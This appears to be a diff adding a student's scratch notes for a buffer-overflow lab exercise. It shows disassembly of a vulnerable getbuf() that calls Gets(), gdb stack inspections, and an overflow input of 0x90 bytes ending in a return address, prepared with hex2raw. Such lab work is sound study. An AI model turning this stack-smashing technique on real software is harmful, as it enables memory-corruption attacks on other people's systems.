@@ -1,0 +1,119 @@
+=> 0x08048d6b <+0>:	push   %ebx
+   0x08048d6c <+1>:	sub    $0x28,%esp
+   0x08048d6f <+4>:	call   0x8048d52 <uniqueval>
+   0x08048d74 <+9>:	mov    %eax,0x1c(%esp)
+   0x08048d78 <+13>:	call   0x8048d3a <getbuf>
+   0x08048d7d <+18>:	mov    %eax,%ebx
+   0x08048d7f <+20>:	call   0x8048d52 <uniqueval>
+   0x08048d84 <+25>:	mov    0x1c(%esp),%edx
+   0x08048d88 <+29>:	cmp    %edx,%eax
+   0x08048d8a <+31>:	je     0x8048d9a <test+47>
+   0x08048d8c <+33>:	movl   $0x804a250,(%esp)
+   0x08048d93 <+40>:	call   0x8048974 <puts@plt>
+   0x08048d98 <+45>:	jmp    0x8048dd0 <test+101>
+   0x08048d9a <+47>:	cmp    0x804c1ec,%ebx
+   0x08048da0 <+53>:	jne    0x8048dc0 <test+85>
+   0x08048da2 <+55>:	mov    %ebx,0x4(%esp)
+   0x08048da6 <+59>:	movl   $0x804a0ca,(%esp)
+   0x08048dad <+66>:	call   0x8048904 <printf@plt>
+   0x08048db2 <+71>:	movl   $0x3,(%esp)
+   0x08048db9 <+78>:	call   0x80491f6 <validate>
+   0x08048dbe <+83>:	jmp    0x8048dd0 <test+101>
+   0x08048dc0 <+85>:	mov    %ebx,0x4(%esp)
+   0x08048dc4 <+89>:	movl   $0x804a0e7,(%esp)
+   0x08048dcb <+96>:	call   0x8048904 <printf@plt>
+   0x08048dd0 <+101>:	add    $0x28,%esp
+   0x08048dd3 <+104>:	pop    %ebx
+   0x08048dd4 <+105>:	ret 
+
+    int getbuf()
+    {
+        char buf[NORMAL_BUFFER_SIZE];
+        Gets(buf);
+        return 1;
+    }
+
+getbuf()
+eeisenb3 1413a4c2
+=> 0x08048d3a <+0>:	sub    $0x3c,%esp // B: $esp = 0x800fb044 (125); A: $esp=0x800fb008 (1)
+   0x08048d3d <+3>:	lea    0x10(%esp),%eax
+   0x08048d41 <+7>:	mov    %eax,(%esp)
+   0x08048d44 <+10>:	call   0x8048c1e <Gets>
+   0x08048d49 <+15>:	mov    $0x1,%eax
+   0x08048d4e <+20>:	add    $0x3c,%esp
+   0x08048d51 <+23>:	ret 
+
+Dump of assembler code for function getbuf:
+   0x08048d3a <+0>:	sub    $0x3c,%esp
+   0x08048d3d <+3>:	lea    0x10(%esp),%eax
+   0x08048d41 <+7>:	mov    %eax,(%esp)
+   0x08048d44 <+10>:	call   0x8048c1e <Gets>
+=> 0x08048d49 <+15>:	mov    $0x1,%eax
+   0x08048d4e <+20>:	add    $0x3c,%esp
+   0x08048d51 <+23>:	ret    
+End of assembler dump.
+
+(gdb) x/s $eax
+0x800fb018:	 "90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 64 8b 04 08"
+(gdb) x/s $esp
+0x800fb008 <_reserved+1028104>:	 "\030\260\017\200\360\377\017\200\364\002yJ,S\216J90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 64 8b 04 08"
+(gdb) x/x $esp
+0x800fb008 <_reserved+1028104>:	0x18
+(gdb) x/x $eax
+0x800fb018:	0x39
+(gdb) print 0x39
+$16 = 57
+
+++++++++++
+./hex2raw < 2_sol.txt > 2_raw.txt
+
+Breakpoint 5, 0x08048cb3 in Gets ()
+(gdb) x/x $esp
+0x800faff4 <_reserved+1028084>:	0x00000000
+(gdb) print *(void **) $esp
+$16 = (void *) 0x0
+(gdb) print /x $esp
+$17 = 0x800faff4
+
+
+Dump of assembler code for function getbuf:
+   0x08048d3a <+0>:	sub    $0x3c,%esp
+   0x08048d3d <+3>:	lea    0x10(%esp),%eax
+=> 0x08048d41 <+7>:	mov    %eax,(%esp)
+   0x08048d44 <+10>:	call   0x8048c1e <Gets>
+   0x08048d49 <+15>:	mov    $0x1,%eax
+   0x08048d4e <+20>:	add    $0x3c,%esp
+   0x08048d51 <+23>:	ret    
+End of assembler dump.
+(gdb) x/x $eax
+0x800fb018:	0x800fb01c
+(gdb) print 0x10
+$1 = 16
+(gdb) x/x $esp
+0x800fb008 <_reserved+1028104>:	0x00000001
+
+eax		content		esp
+B018		B01c		B008
+
+45080		45084		45064
+
+$esp	$eax
+aff4	bo18
+45044	45080
+
+
+eeeee (beginning of getbuf, $esp is)
+be94 -> 48788
+
+
+b044 -> 45124
+
+48788 - 45124 = 3664 = e50
+
+be58 -> 48728
+b008 -> 45064
+48728 - 45064
+
+
+
+
